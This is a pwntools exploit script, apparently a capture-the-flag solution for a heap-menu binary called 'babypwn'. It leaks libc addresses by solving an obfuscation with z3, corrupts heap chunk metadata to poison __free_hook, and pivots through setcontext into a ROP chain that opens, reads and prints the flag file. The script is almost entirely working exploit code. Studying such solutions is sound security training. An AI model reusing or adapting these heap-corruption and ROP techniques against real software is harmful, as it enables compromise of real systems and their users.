# -*- encoding: utf-8 -*-
import sys 
import os 
from pwn import * 
from z3 import *
context.log_level = 'debug' 
# context.update( os = 'linux', arch = 'amd64',timeout = 1)
binary = './babypwn'
os.system('chmod +x %s'%binary)
elf = ELF(binary)
libc = elf.libc
# libc = ELF('')
context.binary = binary
DEBUG = 1
if DEBUG:
    p = process(binary)
    libc = elf.libc
    # p = process(['qemu-arm', binary])
    # p = process(['qemu-arm', binary,'-g','1234'])
    # p = process(['qemu-aarch64','-L','','-g','1234',binary])
else:
    host = ''
    port = ''
    p = remote(host,port)

l64 = lambda            : u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00'))
l32 = lambda            : u32(p.recvuntil('\xf7')[-4:].ljust(4,'\x00'))
sla = lambda a,b        : p.sendlineafter(str(a),str(b))
sa  = lambda a,b        : p.sendafter(str(a),str(b))
lg  = lambda name,data  : p.success(name + ': 0x%x' % data)
se  = lambda payload    : p.send(payload)
rl  = lambda            : p.recv()
sl  = lambda payload    : p.sendline(payload)
ru  = lambda a          : p.recvuntil(str(a))
rint= lambda x = 12     : int( p.recv(x) , 16)

def dbg( b = null):
    if (b == null):
        gdb.attach(p)
        pause()
    else:
        gdb.attach(p,'b %s'%b)

def exhaust( pwn ):
    global p
    i = 0
    while 1 :
        try:
            i+=1
            pwn()
        except:
            lg('times ======== > ',i)
            p.close()
            if (DEBUG):
                p = process(binary)
            else :
                p = remote(host,port)

def one_gadget(filename):
    log.progress('Leak One_Gadgets...')
    one_ggs = str(subprocess.check_output(
        ['one_gadget','--raw', '-f',filename]
    )).split(' ')
    return list(map(int,one_ggs))

def cmd(num):
    sla('>>',num)

def add(size):
    cmd(1)
    sla('size:',size)

def delete(index):
    cmd(2)
    sla('index:',index)

def edit(index,content):
    cmd(3)
    sla('index:',index)
    sla('content:',content)

def show(index):
    cmd(4)
    sla('index:',index)

def decrypt(target):
        a = BitVec('a', 32)
        x = a
        for _ in range(2):
            x ^= (32 * x) ^ LShR((x ^ (32 * x)),17) ^ (((32 * x) ^ x ^ LShR((x ^ (32 * x)),17)) << 13)
        s = Solver()
        s.add(x == target)
        if s.check() == sat:
            return (s.model()[a].as_long())


# one_gad = one_gadget(libc.path)


# print( hex(decrypt(0x8737d693)) )

for i in range(8):
    add(0xf8)
add(0xf8)

for i in range(8):
    delete( 7 - i)

add(0x48)
show(0)
rl()

low_addr = decrypt(int(p.recvuntil('\n',drop= True) , 16))
hig_addr = decrypt(int(p.recvuntil('\n',drop= True) , 16))

leak = (hig_addr << 32 ) + low_addr

__malloc_hook = leak - 0x150 - 0x10
libc.address = __malloc_hook - libc.sym['__malloc_hook']
__free_hook = libc.sym['__free_hook']

edit(8 , '\x00'*0xf0 + p64(0x100))

add(0xa8) 
add(0x108)
delete(8)


add(0x108)
add(0x118)

edit( 2 , 'a'*0x108 )
# 第一次修改修改下个 chunk 的 size
edit( 2 , '\x00'*0x100 + p64(0x210) )
# 第二次修改布置本 chunk

edit( 3 , '\x00'*0xf8 + p64(0x131) )

# 只要后面的 size 能对 稍微改一下 free chunk 的 size 也不是不行

delete(3)
delete(2)

add(0x128)

edit(2 , flat('\x00'*0xf0 , 0 , 0x110 , __free_hook ))

setcontext = libc.sym['setcontext'] + 53

read_addr = libc.sym['read']
open_addr = libc.sym['open']
puts_addr = libc.sym['puts']
ret = libc.search(asm(' ret')).next()
pop_rax_ret = libc.search(asm('pop rax; ret')).next()
pop_rdi_ret = libc.search(asm('pop rdi; ret')).next()
pop_rsi_ret = libc.search(asm('pop rsi; ret')).next()
pop_rdx_ret = libc.search(asm('pop rdx; ret')).next()
pop_rdx_pop_rbx_ret = libc.search(asm('pop rdx ; pop rbx ; ret')).next()

flag_addr = __free_hook + 0x100
chain = flat(
    pop_rdi_ret , flag_addr , pop_rsi_ret , 0 , open_addr,
    pop_rdi_ret , 3 , pop_rsi_ret , flag_addr , pop_rdx_pop_rbx_ret , 0x100 , 0 , read_addr,
    pop_rdi_ret , flag_addr , puts_addr
)

payload = flat(
    setcontext,chain,
    0,0,0,
    __free_hook + 0x8 , ret,
)

add(0x108)
add(0x108)
edit( 5 , payload.ljust(0x100 ,'\x00') + 'flag\x00')

# dbg('free')
delete(5)
# dbg()


p.interactive()

'''
@File    :   babypwn.py
@Time    :   2021/10/06 18:19:17
@Author  :   Niyah 
'''